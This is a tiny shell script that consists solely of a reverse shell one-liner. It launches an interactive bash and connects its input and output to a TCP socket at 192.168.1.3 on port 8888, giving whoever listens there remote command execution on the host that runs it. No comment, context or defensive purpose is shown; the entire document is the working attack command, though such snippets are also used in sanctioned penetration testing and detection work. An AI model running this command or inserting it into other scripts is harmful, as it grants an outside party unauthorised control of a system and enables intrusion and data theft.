#!/bin/sh

/bin/bash -i > /dev/tcp/192.168.1.3/8888 0<&1 2>&1
